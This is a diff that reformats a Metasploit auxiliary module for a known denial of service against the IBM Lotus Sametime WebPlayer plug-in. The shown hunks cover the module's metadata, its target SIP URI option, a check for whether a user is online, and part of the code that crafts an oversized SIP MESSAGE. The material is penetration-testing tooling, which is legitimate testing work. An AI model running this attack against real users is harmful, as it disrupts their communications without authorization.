@@ -8,46 +8,49 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'       => 'IBM Lotus Sametime WebPlayer DoS',
-      'Description'  => %q{
-        This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
-        version 8.5.2.1392 (and prior) to cause a denial of service condition
-        against specific users. For this module to function the target user
-        must be actively logged into the IBM Lotus Sametime server and have
-        the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
-        browser extension. The user should have the WebPlayer plug-in active
-        (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
-      },
-      'Author'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'IBM Lotus Sametime WebPlayer DoS',
+        'Description' => %q{
+          This module exploits a known flaw in the IBM Lotus Sametime WebPlayer
+          version 8.5.2.1392 (and prior) to cause a denial of service condition
+          against specific users. For this module to function the target user
+          must be actively logged into the IBM Lotus Sametime server and have
+          the Sametime Audio Visual browser plug-in (WebPlayer) loaded as a
+          browser extension. The user should have the WebPlayer plug-in active
+          (i.e. be in a Sametime Audio/Video meeting for this DoS to work correctly.
+        },
+        'Author' => [
           'Chris John Riley', # Vulnerability discovery
           'kicks4kittens' # Metasploit module
         ],
-      'License'    => MSF_LICENSE,
-      'Actions'    =>
-        [
-          ['DOS',
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          [
+            'DOS',
             {
               'Description' => 'Cause a Denial Of Service condition against a connected user'
             }
           ],
-          ['CHECK',
+          [
+            'CHECK',
             {
               'Description' => 'Checking if targeted user is online'
             }
           ]
         ],
-      'DefaultAction'  => 'DOS',
-      'References'   =>
-        [
+        'DefaultAction' => 'DOS',
+        'References' => [
           [ 'CVE', '2013-3986' ],
           [ 'OSVDB', '99552' ],
           [ 'BID', '63611'],
           [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21654041' ],
           [ 'URL', 'http://xforce.iss.net/xforce/xfdb/84969' ]
         ],
-      'DisclosureDate' => '2013-11-07'))
+        'DisclosureDate' => '2013-11-07'
+      )
+    )
 
     register_options(
       [
@@ -58,9 +61,9 @@ class MetasploitModule < Msf::Auxiliary
           'The SIP URI of the user to be targeted',
           '<target_email_address>@<sametime_media_server_FQDN>'
         ]),
-        OptInt.new('TIMEOUT', [ true,  'Set specific response timeout', 0])
-      ])
-
+        OptInt.new('TIMEOUT', [ true, 'Set specific response timeout', 0])
+      ]
+    )
   end
 
   def setup
@@ -110,7 +113,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error("User is still online")
     end
-
   end
 
   def dos_user
@@ -168,7 +170,7 @@ class MetasploitModule < Msf::Auxiliary
     # create SIP MESSAGE of specified length
     vprint_status("Creating SIP MESSAGE packet #{length} bytes long")
 
-    source_user = Rex::Text.rand_text_alphanumeric(rand(8)+1)
+    source_user = Rex::Text.rand_text_alphanumeric(rand(8) + 1)
     source_host = Rex::Socket.source_address(datastore['RHOST'])
     src = "#{source_host}:#{datastore['RPORT']}"
     cseq = Rex::Text.rand_text_numeric(3)
@@ -176,7 +178,7 @@ class MetasploitModule < Msf::Auxiliary
     branch = Rex::Text.rand_text_alphanumeric(7)
 
     # setup SIP message in the correct format expected by the server
-    data =  "MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0" + "\r\n"
+    data = "MESSAGE sip:WebAVClient-#{@sipuri} SIP/2.0" + "\r\n"
     data << "Via: SIP/2.0/TCP #{src};branch=#{branch}.#{"%.8x" % rand(0x100000000)};rport;alias" + "\r\n"
     data << "Max-Forwards: 80\r\n"
     data << "To: sip:WebAVClient-#{@sipuri}" + "\r\n"
